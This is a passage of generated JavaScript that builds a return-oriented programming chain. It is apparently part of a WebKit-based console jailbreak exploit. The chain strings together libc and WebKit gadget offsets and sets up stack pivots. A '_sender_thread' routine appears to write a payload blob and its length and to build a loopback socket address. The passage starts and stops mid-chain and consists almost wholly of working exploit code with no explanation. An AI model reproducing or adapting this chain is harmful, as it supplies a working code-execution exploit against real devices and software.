webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170184, //L2554
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2553:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2554:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2555:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+170360, //L2559
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170328, //L2556
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170312, //L2558
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2558:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2556:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2557:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2559:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+170464, //L2561
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170448, //L2560
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2560:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2561:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2562:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2563:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+170664, //L2566
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170632, //L2565
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2565:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2564:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2566:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+170768, //L2568
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170752, //L2567
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2567:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+170880, //L2571
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170848, //L2570
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2570:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2569:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2571:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+170944, //L2572
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L2572:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+171000, //L2574
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2574:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+171144, //L2576
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171160, //L2578
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+171128, //L2577
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2577:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2576:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2578:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+171320, //L2582
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+171288, //L2579
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+171272, //L2581
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2581:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2579:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2580:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2582:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+171448, //L2584
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171464, //L2585
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+171432, //L2583
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2583:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2584:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2585:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+171560, //L2586
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171576, //L2587
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2586:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2587:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+171688, //L2588
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171672, //L2589
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2589:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2588:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+171776, //L2591
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+171760, //L2590
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2590:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2591:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+171872, //L2592
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171888, //L2593
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2592:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2593:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172000, //L2594
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171984, //L2595
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2595:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2594:
db([0, 0]); // 0x0
//_sender_thread:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172072, //L2596
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172136, //L2598
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2598:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+792472, //pop rcx
//L2600:
(window.mira_blob_2||0),
libc_base+793877 //pop rsi
]);
//L2601:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2604:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+792472, //pop rcx
//L2605:
(window.mira_blob_2_len||0),
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2606:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+172384, //L2608
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172400, //L2609
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2608:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2609:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+172560, //L2614
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+172512, //L2611
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172544, //L2613
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2611:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2612:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2613:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2614:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+172688, //L2615
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172704, //L2617
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172672, //L2616
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2616:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2615:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2617:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+172808, //L2621
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172856, //L2622
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+172824, //L2619
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2621:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2619:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2620:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2622:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+172968, //L2623+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+172960, //L2623
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2623:
db([0, 0]); // 0x0
set_gadgets([
ropchain+172984, //L2623+24
ropchain+173288, //L2618
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+173024, //L2624
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2624:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2625:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2626:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+173152, //L2627
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+173168, //L2628
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2627:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2628:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+173280, //L2629
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+173264, //L2630
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2630:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2629:
db([0, 0]); // 0x0
//L2618:
set_gadget(libc_base+788575,); //pop rax
//L2631:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2633:
ropchain+222000, //L2632
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2635:
ropchain+173448, //L2634
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+186296, //L2636
//L2634:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+173536, //L2638
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2637:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2638:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2639:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2640:
db([2, 0]); // 0x2
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2642:
ropchain+173736, //L2641
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+188952, //L2643
//L2641:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+173808, //L2644
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2644:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2645:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L2648:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+173928, //L2650
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2649:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2650:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L2652:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174024, //L2654
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2653:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2654:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174096, //L2656
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2655:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174168, //L2658
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2657:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2658:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174240, //L2660
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2659:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2660:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174312, //L2662
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2661:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2662:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174384, //L2664
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2663:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174456, //L2666
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2665:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2666:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+174528, //L2668
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2667:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2668:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2669:
db([4294967265, 4294967295]); // -0x1f
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+174624, //L2672
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2671:
db([2, 0]); // 0x2
set_gadget(libc_base+788575,); //pop rax
//L2672:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2673:
db([4294967266, 4294967295]); // -0x1e
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+174712, //L2675
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2675:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2677:
db([15651, 0]); // 0x3d23
set_gadgets([
libc_base+562536, //mov [rdi], cx
libc_base+793877, //pop rsi
ropchain+174784, //L2678
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L2678:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2679:
db([4294967268, 4294967295]); // -0x1c
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+174864, //L2682
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2681:
db([16777343, 0]); // 0x100007f
set_gadget(libc_base+788575,); //pop rax
//L2682:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+174912, //L2683
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2683:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2684:
db([16, 0]); // 0x10
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+175024, //L2686
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2685:
db([4294967264, 4294967295]); // -0x20
set_gadget(libc_base+788575,); //pop rax
//L2686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+175112, //L2687
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2687:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2688:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+175216, //L2690
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175232, //L2691
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2690:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2691:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+175384, //L2693
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175416, //L2696
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175400, //L2694
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+175368, //L2695
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2695:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2693:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2694:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2696:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+175512, //L2698
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+175496, //L2697
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2697:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2698:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2700:
ropchain+175616, //L2699
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+184968, //L2701
//L2699:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2703:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+175768, //L2705
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175784, //L2706
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2705:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+175888, //L2709
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+175872, //L2708
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L2708:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2709:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2710:
db([4294967256, 4294967295]); // -0x28
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2712:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2713:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+176048, //L2715
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176064, //L2716
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2715:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2716:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+176216, //L2718
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176248, //L2721
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176232, //L2719
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+176200, //L2720
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2720:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2718:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2719:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2721:
